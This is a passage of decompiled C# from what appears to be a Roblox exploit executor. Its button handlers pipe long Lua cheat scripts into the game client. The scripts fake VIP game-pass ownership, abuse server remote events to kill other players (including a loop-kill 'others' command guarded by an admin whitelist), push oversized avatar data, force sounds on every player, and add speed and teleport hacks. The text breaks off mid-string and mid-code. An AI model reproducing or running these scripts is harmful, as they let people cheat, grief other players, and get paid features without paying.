{}\nname=name:lower()\nif name == 'me' then\nreturn {admin}\nelseif name == 'others' then\nfor i,v in pairs(gPlayers:GetChildren()) do\nif v:IsA'Player'then\nif v.Name~=admin then\nnameTable[#nameTable+1]=v.Name\nend\nend\nend\nelseif name == 'all' then\nfor i,v in pairs(gPlayers:GetChildren()) do\nif v:IsA'Player'then \nnameTable[#nameTable+1]=v.Name\nend\nend\nelse\nfor i,v in pairs(gPlayers:GetChildren()) do\nlocal lname = v.Name:lower()\nlocal i,j = lname:find(name)\nif i == 1 then\nreturn {v.Name}\nend\nend\nend\nreturn nameTable\nend\n\n-- commands --\n\naddcmd('Vip','Gives u VIP',nil,\nfunction(args)\nname = game:GetService('Players').LocalPlayer.Name\nlocal PATH = game:GetService('ReplicatedStorage').PlayerData[name].CachedPasses\n\nlocal Folder1 = Instance.new('Folder')\nFolder1.Parent = PATH\nFolder1.Name = '1056689214'\n\nlocal Folder2 = Instance.new('Folder')\nFolder2.Parent = PATH\nFolder2.Name = '449630072'\n\nlocal Folder3 = Instance.new('Folder')\nFolder3.Parent = PATH\nFolder3.Name = '451671148'\n\nlocal Folder4 = Instance.new('Folder')\nFolder4.Parent = PATH\nFolder4.Name = '629102188'\n\nlocal Folder5 = Instance.new('Folder')\nFolder5.Parent = PATH\nFolder5.Name = '748170248'\n\nlocal Folder6 = Instance.new('Folder')\nFolder6.Parent = PATH\nFolder6.Name = '752909285'\n\nlocal Folder7 = Instance.new('Folder')\nFolder7.Parent = PATH\nFolder7.Name = '790960993'\n\nlocal Folder8 = Instance.new('Folder')\nFolder8.Parent = PATH\nFolder8.Name = '859238750'\n\nlocal Folder9 = Instance.new('Folder')\nFolder9.Parent = PATH\nFolder9.Name = '449630210'\n\nlocal Folder10 = Instance.new('Folder')\nFolder10.Parent = PATH\nFolder10.Name = '1404986936'\nend)\n\naddcmd('Meme','HMPH',nil,\nfunction(args)\n--Made by N3xul.\nlocal weird =\n{\n['assets'] =\n{\n[1] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 616980142,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[2] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 602599987,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[3] =\n{\n['drotation'] =\n{\n['y'] = 180,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 100,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 244159819,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[4] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 7075502,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[5] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 916733101,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n}\n},\n['description'] = '',\n['createdDate'] = 1000,\n['lowerDesc'] = '',\n['bodyColors'] =\n{\n['HeadColor'] = Color3.new(1, 0, 0),\n['TorsoColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['LeftArmColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightLegColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightArmColor'] = Color3.new(1, 0, 0),\n['LeftLegColor'] = Color3.new(1, 0, 0)\n},\n['scales'] =\n{\n['LowerLegHeight'] = 5,\n['UpperTorsoWidth'] = 5,\n['UpperArmHeight'] = 5,\n['HandHeight'] = 5,\n['UpperLegWidth'] = -1,\n['LowerArmWidth'] = -1,\n['FootWidth'] = 5,\n['LowerArmHeight'] = -1,\n['UpperArmWidth'] = -1,\n['FootHeight'] = 5,\n['LowerTorsoWidth'] = -1,\n['UpperTorsoHeight'] = -1,\n['HandWidth'] = -1,\n['HeadScale'] = -1,\n['UpperLegHeight'] = -1,\n['LowerTorsoHeight'] = -1,\n['LowerLegWidth'] = -1\n},\n['name'] = '',\n['outfitId'] = 1,\n['isOutfit'] = true,\n['collageSeed'] = 0,\n['lowerName'] = ''\n}\nlocal Event = game:GetService('ReplicatedStorage').AvatarEditor.Remote.CommitCharacterAppearance\nEvent:FireServer(weird)\nend)\n\naddcmd('Jeff','Makes sound SMH',nil,\nfunction(args)\nlocal remote = Game['ReplicatedStorage']['ClientRequests']['Music']['PlayRadioSong']\nlocal args = {\n[1] = '333637668'\n}\nremote:InvokeServer(unpack(args))\nend)\n\naddcmd('Pawnshop','Pawned NOOB',nil,\nfunction(args)\nlocal remote = Game['ReplicatedStorage']['ClientRequests']['Music']['PlayRadioSong']\nlocal args = {\n[1] = '482683318'\n}\nremote:InvokeServer(unpack(args))\nend)\n\naddcmd('Bighead','BOOM your dead',nil,\nfunction(args)\n--Brought to you by N3xul.\nlocal OOF =\n{\n['assets'] =\n{\n[1] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 10000,\n['x'] = 10000,\n['z'] = 10000\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 916733101,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[2] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 20000,\n['x'] = 20000,\n['z'] = 20000\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 602599987,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[3] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 10000,\n['x'] = 10000,\n['z'] = 10000\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 616980142,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[4] =\n{\n['drotation'] =\n{\n['y'] = 180,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 100,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 1250,\n['x'] = 1250,\n['z'] = 12500\n},\n['dscale'] =\n{\n['y'] = 750,\n['x'] = 750,\n['z'] = 750\n},\n['vscale'] =\n{\n['y'] = 1.25,\n['x'] = 1.25,\n['z'] = 1.25\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 244159819,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[5] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 5000,\n['x'] = 5000,\n['z'] = 5000\n},\n['dscale'] =\n{\n['y'] = 5000,\n['x'] = 5000,\n['z'] = 5000\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 7075502,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n}\n},\n['description'] = '',\n['createdDate'] = 1000,\n['lowerDesc'] = '',\n['bodyColors'] =\n{\n['HeadColor'] = Color3.new(1, 0, 0),\n['TorsoColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['LeftArmColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightLegColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightArmColor'] = Color3.new(1, 0, 0),\n['LeftLegColor'] = Color3.new(1, 0, 0)\n},\n['scales'] =\n{\n['LowerLegHeight'] = 1,\n['UpperTorsoWidth'] = 1,\n['UpperArmHeight'] = 1,\n['HandHeight'] = 1,\n['UpperLegWidth'] = 1,\n['LowerArmWidth'] = 1,\n['FootWidth'] = 1,\n['LowerArmHeight'] = 1,\n['UpperArmWidth'] = 1,\n['FootHeight'] = 1,\n['LowerTorsoWidth'] = 1,\n['UpperTorsoHeight'] = 1,\n['HandWidth'] = 1,\n['HeadScale'] = 500,\n['UpperLegHeight'] = 1,\n['LowerTorsoHeight'] = 1,\n['LowerLegWidth'] = 1\n},\n['name'] = 'GAY',\n['outfitId'] = 1,\n['isOutfit'] = true,\n['collageSeed'] = 0,\n['lowerName'] = ''\n}\nlocal Event = game:GetService('ReplicatedStorage').AvatarEditor.Remote.CommitCharacterAppearance\nEvent:FireServer(OOF)\nend)\n\naddcmd('ws','change a players walkspeed',{},\n function(args)\n     -- << K1LL0X >> --\n\n--This may be a little buggy, so beware.\n--Hold 'Q' to speed up\n\n\n\n\n\n\ndown = false\nvelocity = Instance.new('BodyVelocity')\nvelocity.maxForce = Vector3.new(100000, 0, 100000)\n---vv Use that to change the speed v\nlocal speed = 150\ngyro = Instance.new('BodyGyro')\ngyro.maxTorque = Vector3.new(100000, 0, 100000)\n\nlocal hum = game.Players.LocalPlayer.Character.Humanoid\n\nfunction onButton1Down(mouse)\ndown = true\nvelocity.Parent = game.Players.LocalPlayer.Character.UpperTorso\nvelocity.velocity = (hum.MoveDirection) * speed\ngyro.Parent = game.Players.LocalPlayer.Character.UpperTorso\nwhile down do\nif not down then break end\nvelocity.velocity = (hum.MoveDirection) * speed\nlocal refpos = gyro.Parent.Position + (gyro.Parent.Position - workspace.CurrentCamera.CoordinateFrame.p).unit * 5\ngyro.cframe = CFrame.new(gyro.Parent.Position, Vector3.new(refpos.x, gyro.Parent.Position.y, refpos.z))\nwait(0.1)\nend\nend\n\nfunction onButton1Up(mouse)\nvelocity.Parent = nil\ngyro.Parent = nil\ndown = false\nend\n--To Change the key in those 2 lines, replace the 'q' with your desired key\nfunction onSelected(mouse)\nmouse.KeyDown:connect(function(k) if k:lower()=='q'then onButton1Down(mouse)end end)\nmouse.KeyUp:connect(function(k) if k:lower()=='q'then onButton1Up(mouse)end end)\nend\n\nonSelected(game.Players.LocalPlayer:GetMouse())\n end)\n\naddcmd('clicktp','Your GOD',{},\n function(args)\n     player1=game.Players.LocalPlayer\n\nq=Instance.new('HopperBin', player1.Backpack)\nq.Name = 'Click Teleport'\n\n\nbin = q\n\n\n\nfunction teleportPlayer(pos)\nlocal player = game.Players.LocalPlayer\nif player == nil or player.Character == nil then return end\nplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x, pos.y + 7, pos.z))\nend\n\n\nenabled = true\nfunction onButton1Down(mouse)\nif not enabled then\nreturn\nend\n\nlocal player = game.Players.LocalPlayer\nif player == nil then return end\n\n\nenabled = false\nlocal cf = mouse.Hit\nlocal v = cf.lookVector\n\nteleportPlayer(cf.p)\n\nwait()\nenabled = true\n\nend\n\nfunction onSelected(mouse)\nmouse.Icon = 'rbxasset://textures\\ArrowCursor.png'\nmouse.Button1Down:connect(function() onButton1Down(mouse) end)\nend\n\nbin.Selected:connect(onSelected)\nend)\n\n\n   addcmd('titan','Sie sind das Essen und Wir sind die Jaeger!',nil,\n   function(args)\n  --Made by N3xul.\nlocal titan =\n{\n['assets'] =\n{\n[1] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 616980142,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[2] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 602599987,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[3] =\n{\n['drotation'] =\n{\n['y'] = 180,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 100,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 244159819,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[4] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 7075502,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[5] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 916733101,\n['changed[...string is too long...]");
    }

    private void flatButton276_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("wait(.2)\nwhitelist = {game.Players.LocalPlayer.Name,'Vortexturize','BINO2002'} -- put admin names here\nbanlist = {'noob','noob2'} -- put noob names here\ndeletepath = game.Players.LocalPlayer.Character:FindFirstChild('Delete')\ndeletepath2 = game.Players.LocalPlayer.Backpack:FindFirstChild('Delete')\nslock = false\n\nfunction newtag(plr)\nadmintag = Instance.new('BoolValue')\n    admintag.Parent = game.Players[plr]\n    admintag.Value = true\n    admintag.Name = 'admin'\n    print('created admin tag for ' .. plr)\nend\n\nfunction newsuc(plr)\nadmintag = Instance.new('BoolValue')\n    admintag.Parent = game.Players[plr]\n    admintag.Value = true\n    admintag.Name = 'suc'\n    print('loopkilling ' .. plr)\nend\n\nfunction newdab(plr)\nadmintag = Instance.new('BoolValue')\n    admintag.Parent = game.Players[plr]\n    admintag.Value = true\n    admintag.Name = 'dab'\n    print('loopkilling ' .. plr)\nend\n\nnewtag(game.Players.LocalPlayer.Name)\n\ngame.Players.LocalPlayer.ChildRemoved:connect(function(obj)\n    if obj.Name == 'admin' then\n        newtag(game.Players.LocalPlayer.Name)\n    end\nend)    \n    \n            function adminexe(plr,msg)\n                if plr:FindFirstChild('admin') then\n                \n            local lower = string.lower(msg)\n            local len = string.len(lower)\n            \n            \n\n\n\tif string.find(lower,':kill ') then\n                local name = string.gsub(lower,':kill ','')\n                local player = nil\n                \n                if name == 'others' then\n                        for i,v in pairs(game.Players:GetChildren()) do\n                            if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                                game.ReplicatedStorage.Event:FireServer('TPD', 20000, v.Character.Humanoid)\n                            end\n                        end\n                else\n                    \n                    names = game.Players:GetChildren()\n                                \n                            for i,v in pairs(names) do\n                                strlower = string.lower(v.Name)\n                                sub = string.sub(strlower,1,#name)                      \n                                \n                                if name == sub then \n                                    player = v\n                                    if player.Name ~= game.Players.LocalPlayer.Name then\n                                    game.ReplicatedStorage.Event:FireServer('TPD', 20000, player.Character.Humanoid) \n                                    end\n                                end\n                            end\n                end\n                end\n\n\n\n\t\tif string.find(lower,':tk ') then\n                local name = string.gsub(lower,':tk ','')\n                local player = nil\n\t\tlocal dab = nil\n                \n                if name == 'others' then\n                        for i,v in pairs(game.Players:GetChildren()) do\n                            if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n\t\t\t\tdab = v.Character.Humanoid.Health\n                                game.ReplicatedStorage.Event:FireServer('TPD', dab, v.Character.Humanoid)\n                            end\n                        end\n                else\n                    \n                    names = game.Players:GetChildren()\n                                \n                            for i,v in pairs(names) do\n                                strlower = string.lower(v.Name)\n                                sub = string.sub(strlower,1,#name)                      \n                                \n                                if name == sub then \n                                    player = v\n                                    if player.Name ~= game.Players.LocalPlayer.Name then\n\t\t\t\t\tdab = v.Character.Humanoid.Health\n                                    game.ReplicatedStorage.Event:FireServer('TPD', dab, player.Character.Humanoid) \n                                    end\n                                end\n                            end\n                end\n                end\n\n\t\n\n                \n\n\t\t\n\n            \n\t\tif string.find(lower,'/e kill ') then\n                local name = string.gsub(lower,'/e kill ','')\n                local player = nil\n                \n                if name == 'others' then\n                        for i,v in pairs(game.Players:GetChildren()) do\n                            if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                                 game.ReplicatedStorage.Event:FireServer('TPD', 20000, v.Character.Humanoid) \n                                \n                            end\n                        end\n                else\n                    \n                    names = game.Players:GetChildren()\n                                \n                            for i,v in pairs(names) do\n                                strlower = string.lower(v.Name)\n                                sub = string.sub(strlower,1,#name)                      \n                                \n                                if name == sub then \n                                    player = v\n                                    if player.Name ~= game.Players.LocalPlayer.Name then\n                                     game.ReplicatedStorage.Event:FireServer('TPD', 20000, player.Character.Humanoid)   \n                                    end\n                                end\n                            end\n                end\n                end\n\n\t\tif string.find(lower,'/e :kill ') then\n                local name = string.gsub(lower,'/e :kill ','')\n\t\t\n                local player = nil\n                \n                if name == 'others' then\n                        for i,v in pairs(game.Players:GetChildren()) do\n                            if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                                game.ReplicatedStorage.Event:FireServer('TPD', 20000, v.Character.Humanoid) \n                            end\n                        end\n                else\n                    \n                    names = game.Players:GetChildren()\n                                \n                            for i,v in pairs(names) do\n                                strlower = string.lower(v.Name)\n                                sub = string.sub(strlower,1,#name)                      \n                                \n                                if name == sub then \n                                    player = v\n                                    if player.Name ~= game.Players.LocalPlayer.Name then\n                                     game.ReplicatedStorage.Event:FireServer('TPD', 20000, player.Character.Humanoid) \n                                    end\n                                end\n                            end\n                end\n                end\n\n\t\t\n\n\n\n\t\tif string.find(lower,':playall ') then\n                local name = string.gsub(lower,':playall ','')\n                local player = nil\n                \tfor i,v in pairs(game.Players:GetChildren()) do\n\t\t\tgame.ReplicatedStorage.Event:FireServer('PlayRadio', v, name)\n\t\t\tend\n                end\n\n\n\t\tif string.find(lower,'/e playall ') then\n                local name = string.gsub(lower,'/e playall ','')\n                local player = nil\n                \tfor i,v in pairs(game.Players:GetChildren()) do\n\t\t\tgame.ReplicatedStorage.Event:FireServer('PlayRadio', v, name)\n\t\t\tend\n                end\n\n\n\t\tif string.find(lower,'/e :playall ') then\n                local name = string.gsub(lower,'/e :playall ','')\n                local player = nil\n                \tfor i,v in pairs(game.Players:GetChildren()) do\n\t\t\tgame.ReplicatedStorage.Event:FireServer('PlayRadio', v, name)\n\t\t\tend\n                end\n\n\t\tif string.find(lower,':say10 ') then\n                local name = string.gsub(lower,':say10 ','')\n                local player = nil\n                \tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n                \tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n\t\t\tgame.Players:Chat(name)\n                end\n\n\n\n\t\t\n\n\t\tif string.find(lower,':music gear: ') then\n                local name = string.gsub(lower,':music gear: ','')\n                local player = nil\n                \tfor i,v in pairs(game.Players:GetChildren()) do\n\t\t\tgame.ReplicatedStorage.Event:FireServer('PlayRadio', v, name)\n\t\t\tend\n                end\n\n\t\tif string.find(lower,':stopall') then\n                local player = nil\n                \t\tfor i,v in pairs(game.Players:GetChildren()) do\n\t\t\t\tgame.ReplicatedStorage.Event:FireServer('StopRadio', v)\n\t\t\t\tend\n                end\n\n\t\tif string.find(lower,'/e stopall') then\n                local player = nil\n                \t\tfor i,v in pairs(game.Players:GetChildren()) do\n\t\t\t\tgame.ReplicatedStorage.Event:FireServer('StopRadio', v)\n\t\t\t\tend\n                end\n\n\t\tif string.find(lower,'/e :stopall') then\n                local player = nil\n                \t\tfor i,v in pairs(game.Players:GetChildren()) do\n\t\t\t\tgame.ReplicatedStorage.Event:FireServer('StopRadio', v)\n\t\t\t\tend\n                end\n\n\t\tif string.find(lower,':stop') then\n                local player = nil\n                \tgame.ReplicatedStorage.Event:FireServer('StopRadio', game.Players.LocalPlayer)\n                end\n\n\t\tif string.find(lower,'/e stop') then\n                local player = nil\n                \tgame.ReplicatedStorage.Event:FireServer('StopRadio', game.Players.LocalPlayer)\n                end\n\t\tif string.find(lower,'/e :stop') then\n                local player = nil\n                \tgame.ReplicatedStorage.Event:FireServer('StopRadio', game.Players.LocalPlayer)\n                end\n\n\t\tif string.find(lower,':play ') then\n                local name = string.gsub(lower,':play ','')\n                local player = nil\n\n                \tgame.ReplicatedStorage.Event:FireServer('PlayRadio', game.Players.LocalPlayer, name)\n\t\t\t\n                end\n\n\t\tif string.find(lower,'/e play ') then\n                local name = 